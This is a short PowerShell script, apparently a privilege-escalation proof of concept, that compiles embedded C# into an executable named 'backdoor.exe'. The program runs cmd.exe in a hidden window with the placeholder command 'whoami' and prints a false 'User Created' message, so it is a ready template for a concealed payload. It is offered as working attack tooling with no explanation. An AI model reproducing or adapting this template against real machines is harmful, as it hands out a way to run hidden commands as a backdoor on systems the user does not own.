$code = @"
using System;
namespace AddUsers
{
    public class AddUsers
    {
        public static void Main(){
            System.Diagnostics.Process Process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo strtInfo = new System.Diagnostics.ProcessStartInfo();
            strtInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            strtInfo.FileName = "cmd.exe";
            strtInfo.Arguments = "/c whoami";
            Process.StartInfo = strtInfo;
            Process.Start();
            Console.WriteLine("User Created");
        }
    }
}
"@
Add-Type -outputtype consoleapplication -outputassembly backdoor.exe -TypeDefinition $code -Language CSharp
